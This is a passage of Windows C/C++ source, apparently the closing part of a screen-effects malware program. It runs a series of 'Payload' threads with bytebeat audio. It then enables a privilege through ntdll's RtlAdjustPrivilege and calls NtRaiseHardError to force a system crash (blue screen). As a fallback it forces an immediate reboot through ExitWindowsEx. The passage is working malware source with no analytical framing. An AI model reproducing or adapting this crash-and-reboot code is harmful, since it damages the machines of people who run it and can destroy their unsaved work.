			TerminateThread(thread11_num1, 0);
			CloseHandle(thread11_num1);
			refreshscr();
			Sleep(100);
			HANDLE thread12_num1 = CreateThread(0, 0, Payload12_num1, 0, 0, 0);
			HANDLE thread12_num2 = CreateThread(0, 0, Payload12_num2, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12_num1, 0);
			CloseHandle(thread12_num1);
			TerminateThread(thread12_num2, 0);
			CloseHandle(thread12_num2);
			refreshscr();
			Sleep(100);
			HANDLE thread13 = CreateThread(0, 0, Payload13_num1, 0, 0, 0);
			bytebeat13();
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			refreshscr();
			Sleep(100);
			HANDLE thread14_num1 = CreateThread(0, 0, Payload14_num1, 0, 0, 0);
			HANDLE thread14_num2 = CreateThread(0, 0, Payload14_num2, 0, 0, 0);
			HANDLE thread14_num3 = CreateThread(0, 0, Payload14_num3, 0, 0, 0);
			bytebeat14();
			TerminateThread(thread14_num1, 0);
			CloseHandle(thread14_num1);
			TerminateThread(thread14_num2, 0);
			CloseHandle(thread14_num2);
			TerminateThread(thread14_num3, 0);
			CloseHandle(thread14_num3);
			refreshscr();
			Sleep(100);
			HANDLE thread15 = CreateThread(0, 0, Payload15_num1, 0, 0, 0);
			bytebeat15();
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			refreshscr();
			Sleep(100);
			TerminateThread(thread3_num2, 0);
			CloseHandle(thread3_num2);
			TerminateThread(thread3_num3, 0);
			CloseHandle(thread3_num3);
			TerminateThread(thread7_num2, 0);
			CloseHandle(thread7_num2);
			TerminateThread(thread11_num2, 0);
			CloseHandle(thread11_num2);
			refreshscr();
			Sleep(100);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xCF69CF69, 0, 0, 0, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
		}
	}
	return 0;
}